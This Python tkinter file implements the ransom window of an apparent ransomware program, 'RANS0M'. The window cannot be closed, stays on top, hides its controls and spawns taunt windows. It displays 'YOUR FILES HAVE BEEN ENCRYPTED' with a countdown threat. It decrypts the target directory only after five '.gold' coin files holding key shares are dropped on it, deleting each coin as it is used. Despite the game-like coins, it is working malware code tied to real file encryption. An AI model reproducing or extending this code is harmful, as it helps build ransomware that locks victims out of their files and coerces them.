import base64
import os
import threading
import tkinter as tk
from tkinter import ttk
from PIL import Image, ImageTk

from global_state import Global
from resources import resource
from sound_helper import SoundHelper
from taunt_window import TauntWindow
from winutil import hide_control_box

try:
    from tkinterdnd2 import DND_FILES
except Exception:
    DND_FILES = None


class Ransomed(tk.Toplevel):
    def __init__(self, master):
        super().__init__(master)

        self.remaining_time = Global.RANSOM_DURATION
        self._shares = {}
        self._cash_played = False

        self.title("RANS0M")
        self.configure(bg="red")
        self.geometry("544x315")
        self.resizable(False, False)
        self.attributes("-topmost", True)
        self.transient(master)
        self.protocol("WM_DELETE_WINDOW", lambda: None)

        def face(name, size=(188, 185)):
            return ImageTk.PhotoImage(Image.open(resource(name)).resize(size), master=self)

        self._face_frames = [face("ransom_idle.png"), face("ransom_random.png"),
                             face("ransom_attack.png"), face("static1.png")]
        self._face_label = tk.Label(self, image=self._face_frames[0], bg="red")
        self._face_label.place(x=28, y=12, width=188, height=185)
        self._animate_face()

        tk.Label(self, text="YOUR FILES HAVE BEEN ENCRYPTED", font=("Consolas", 20, "bold"),
                 fg="white", bg="red", wraplength=260, justify="center"
                 ).place(x=233, y=9, width=267, height=154)

        tk.Label(self, text="IF YOU DO NOT PAY THIS RANSOM BY THE END OF THE TIMER, "
                            "YOUR FILES WILL BE UNRECOVERABLE BY ANY MEANS.",
                 font=("Consolas", 12, "bold"), fg="white", bg="black",
                 wraplength=500, justify="center", relief="ridge", bd=2
                 ).place(x=12, y=166, width=520, height=76)

        self._cash_label = tk.Label(self, text=str(Global.ransom_left), font=("Consolas", 30, "bold"),
                                    fg="gold", bg="black", anchor="w", padx=6,
                                    relief="ridge", bd=2)
        self._cash_label.place(x=12, y=246, width=188, height=61)

        pil = Image.open(resource("Gold.png")).resize((66, 61))
        self._coin_photo = ImageTk.PhotoImage(pil, master=self)
        tk.Label(self, image=self._coin_photo, bg="black").place(x=134, y=246, width=66, height=61)

        self._time_label = tk.Label(self, text="TIME: 00:00:00", font=("Consolas", 30, "bold"),
                                    fg="black", bg="red", relief="ridge", bd=2)
        self._time_label.place(x=206, y=245, width=326, height=61)

        if DND_FILES is not None:
            try:
                self.drop_target_register(DND_FILES)
                self.dnd_bind("<<Drop>>", self._on_drop)
            except Exception:
                pass

        self._update_labels()
        self.after(1000, self._tick)

        x = Global.rng.randint(0, max(0, Global.screen_bounds[0] - 560))
        y = Global.rng.randint(0, max(0, Global.screen_bounds[1] - 354))
        self.geometry(f"+{x}+{y}")

        hide_control_box(self)

        for _ in range(6):
            try:
                TauntWindow(self.master)
            except Exception:
                pass

        Global.glitch_idle(self, divide_and_taunt=True,
                           spawn_taunt=lambda: TauntWindow(self.master))


    def _animate_face(self):
        try:
            if not self.winfo_exists():
                return
            r = Global.rng.random()
            if r < 0.42:
                frame = self._face_frames[0]
            elif r < 0.86:
                frame = self._face_frames[1]
            elif r < 0.93:
                frame = self._face_frames[2]
            else:
                frame = self._face_frames[3]
            self._face_label.config(image=frame)
        except Exception:
            return
        self.after(80, self._animate_face)

    def _tick(self):
        try:
            if not self.winfo_exists():
                return
        except Exception:
            return
        self.remaining_time -= 1
        self._update_labels()
        self.after(1000, self._tick)

    def _update_labels(self):
        try:
            self._cash_label.config(text=str(Global.ransom_left))
            h, rem = divmod(self.remaining_time, 3600)
            m, s = divmod(rem, 60)
            self._time_label.config(text=f"TIME: {h:02d}:{m:02d}:{s:02d}")
        except Exception:
            pass


    def _on_drop(self, event):
        try:
            files = self.tk.splitlist(event.data)
        except Exception:
            return
        self._process_coins(str(p) for p in files)

    def _process_coins(self, paths):
        from poc_coins import decrypt_coin

        self._cash_played = False

        for file in paths:
            file = str(file)
            if not file.endswith(".gold") or not os.path.isfile(file):
                continue
            try:
                coin = decrypt_coin(file)
                idx = int(coin["SHARE_IDX"])
                if idx in self._shares:
                    continue
                if not self._cash_played:
                    sfx = SoundHelper.create(resource("cash.wav"))
                    sfx.volume = 0.5
                    sfx.play()
                    self._cash_played = True
                self._shares[idx] = base64.b64decode(coin["SHARE"])
                Global.ransom_left -= 100
                os.remove(file)
            except Exception:
                continue

        self._update_labels()

        if len(self._shares) >= 5 and Global.ransom_left <= 0:
            from ransom_crypto import join_secret, private_key_from_pem
            from ransomware_encryptor import decrypt_tree

            key = private_key_from_pem(join_secret([self._shares[i] for i in range(5)]))
            Global.under_ransom = False

            try:
                if Global.ransom_paid_cb:
                    Global.ransom_paid_cb()
            except Exception:
                pass

            master = self.master
            progress = DecryptProgress(master)

            def worker():
                def cb(done, total, _df, _tf):
                    pct = (done * 100.0 / total) if total else 100.0
                    try:
                        master.after(0, lambda p=pct: progress.update_progress(p))
                    except Exception:
                        pass
                decrypt_tree(Global.TARGET_PATH, key, progress=cb)
                try:
                    master.after(0, lambda: (progress.finish(), master._quit()))
                except Exception:
                    pass

            threading.Thread(target=worker, daemon=True).start()
            try:
                self.destroy()
            except Exception:
                pass


class DecryptProgress(tk.Toplevel):

    def __init__(self, master):
        super().__init__(master)
        self.title("RANS0M")
        self.configure(bg="black")
        self.geometry("460x130")
        self.resizable(False, False)
        self.attributes("-topmost", True)
        self.transient(master)
        self.protocol("WM_DELETE_WINDOW", lambda: None)
        hide_control_box(self)

        tk.Label(self, text="DECRYPTING YOUR FILES...", font=("Consolas", 16, "bold"),
                 fg="lime", bg="black").pack(pady=(18, 6))
        self._bar = ttk.Progressbar(self, orient="horizontal", length=400, maximum=100)
        self._bar.pack(pady=4)
        self._pct = tk.Label(self, text="0%", font=("Consolas", 12, "bold"),
                             fg="white", bg="black")
        self._pct.pack()

        x = max(0, (Global.screen_bounds[0] - 460) // 2)
        y = max(0, (Global.screen_bounds[1] - 130) // 2)
        self.geometry(f"+{x}+{y}")
        hide_control_box(self)

    def update_progress(self, pct):
        try:
            self._bar.config(value=pct)
            self._pct.config(text=f"{pct:.0f}%")
        except Exception:
            pass

    def finish(self):
        try:
            self.destroy()
        except Exception:
            pass
